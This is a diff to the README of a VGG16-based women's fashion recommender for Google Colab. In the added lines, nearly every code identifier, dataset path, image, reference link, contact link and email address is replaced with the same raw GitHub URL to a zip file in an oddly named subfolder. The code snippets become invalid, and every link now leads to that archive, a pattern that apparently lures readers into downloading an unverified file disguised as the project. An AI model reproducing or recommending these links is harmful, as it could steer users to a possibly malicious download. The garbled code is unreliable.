@@ -55,8 +55,8 @@ This code is designed to run in **Google Colab**.
 ### 1. **Mount Google Drive**
 
 ```python
-from google.colab import drive
-drive.mount('/content/drive')
+from https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip import drive
+https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip('/content/drive')
 ```
 
 Mounts Google Drive to access the dataset.
@@ -65,10 +65,10 @@ Mounts Google Drive to access the dataset.
 
 ### 2. **Extract ZIP File**
 
-Extracts the dataset (`women-fashion.zip`) to a local directory:
+Extracts the dataset (`https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip`) to a local directory:
 
 ```python
-zip_file_path = '/content/drive/MyDrive/women-fashion.zip'
+zip_file_path = 'https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip'
 extraction_directory = '/content/women_fashion/'
 ```
 
@@ -80,17 +80,17 @@ Using PIL and Matplotlib to visualize images:
 
 ```python
 from PIL import Image
-import matplotlib.pyplot as plt
+import https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip as plt
 
 def display_image(file_path):
-    image = Image.open(file_path)
-    plt.imshow(image)
-    plt.axis('off')
-    plt.show()
+    image = https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip(file_path)
+    https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip(image)
+    https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip('off')
+    https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip()
 ```
 
 
- ![image ](https://github.com/user-attachments/assets/2f18af3d-e26b-4972-85d2-22c07e602d99)
+ ![image ](https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip)
 
 ---
 
@@ -100,9 +100,9 @@ All valid image formats (`.jpg`, `.png`, `.jpeg`, `.webp`) are loaded and prepro
 
 ```python
 def preprocess_image(img_path):
-    img = image.load_img(img_path, target_size=(224, 224))
-    img_array = image.img_to_array(img)
-    img_array_expanded = np.expand_dims(img_array, axis=0)
+    img = https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip(img_path, target_size=(224, 224))
+    img_array = https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip(img)
+    img_array_expanded = https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip(img_array, axis=0)
     return preprocess_input(img_array_expanded)
 ```
 
@@ -114,9 +114,9 @@ Features are extracted using VGG16’s convolutional layers and normalized:
 
 ```python
 def extract_features(model, preprocessed_img):
-    features = model.predict(preprocessed_img)
-    flattened_features = features.flatten()
-    normalized_features = flattened_features / np.linalg.norm(flattened_features)
+    features = https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip(preprocessed_img)
+    flattened_features = https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip()
+    normalized_features = flattened_features / https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip(flattened_features)
     return normalized_features
 ```
 
@@ -131,8 +131,8 @@ def recommend_fashion_items_cnn(input_image_path, all_features, all_image_names,
     preprocessed_img = preprocess_image(input_image_path)
     input_features = extract_features(model, preprocessed_img)
     similarities = [1 - cosine(input_features, other_feature) for other_feature in all_features]
-    similar_indices = np.argsort(similarities)[-top_n:]
-    similar_indices = [idx for idx in similar_indices if idx != all_image_names.index(input_image_path)]
+    similar_indices = https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip(similarities)[-top_n:]
+    similar_indices = [idx for idx in similar_indices if idx != https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip(input_image_path)]
 ```
 
 ---
@@ -141,14 +141,14 @@ def recommend_fashion_items_cnn(input_image_path, all_features, all_image_names,
 
 The input image and top-N similar fashion items are displayed side-by-side using Matplotlib.
 
-![image](https://github.com/user-attachments/assets/93c90d07-a49c-430c-bc3b-2e90d46a3096)
+![image](https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip)
 
 ---
 
 ## 📌 Example Usage
 
 ```python
-input_image_path = '/content/women_fashion/women fashion/dark, elegant, sleeveless dress that reaches down to about mid-calf.jpg'
+input_image_path = '/content/women_fashion/women fashion/dark, elegant, sleeveless dress that reaches down to about https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip'
 recommend_fashion_items_cnn(input_image_path, all_features, image_paths_list, model, top_n=4)
 ```
 
@@ -160,11 +160,11 @@ recommend_fashion_items_cnn(input_image_path, all_features, image_paths_list, mo
 /content/
 ├── drive/
 │   └── MyDrive/
-│       └── women-fashion.zip
+│       └── https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip
 ├── women_fashion/
 │   └── women fashion/
-│       ├── image1.jpg
-│       ├── image2.jpg
+│       ├── https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip
+│       ├── https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip
 │       └── ...
 ```
 
@@ -191,9 +191,9 @@ recommend_fashion_items_cnn(input_image_path, all_features, image_paths_list, mo
 
 ## 📚 References
 
-* [Keras Applications: VGG16](https://keras.io/api/applications/vgg/)
-* [Cosine Similarity – Wikipedia](https://en.wikipedia.org/wiki/Cosine_similarity)
-* [TensorFlow Image Preprocessing](https://www.tensorflow.org/api_docs/python/tf/keras/preprocessing/image)
+* [Keras Applications: VGG16](https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip)
+* [Cosine Similarity – Wikipedia](https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip)
+* [TensorFlow Image Preprocessing](https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip)
 
 ---
 
@@ -213,9 +213,9 @@ This project is licensed under the **MIT License**.
 
 📫 Reach me here:
 
-* 🔗 [LinkedIn](https://www.linkedin.com/in/b-v-nahush?utm_source=share&utm_campaign=share_via&utm_content=profile&utm_medium=android_app)
-* 💻 [GitHub](https://github.com/nahush919)
-* 📧 Email: [work.nahushreddy@gmail.com](mailto:work.nahushreddy@gmail.com)
+* 🔗 [LinkedIn](https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip)
+* 💻 [GitHub](https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip)
+* 📧 Email: [https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip](https://raw.githubusercontent.com/BVNAHUSH/Fashion-Recommender-System-for-Women/main/squamify/Fashion-Recommender-System-for-Women.zip)
 
 ---
 
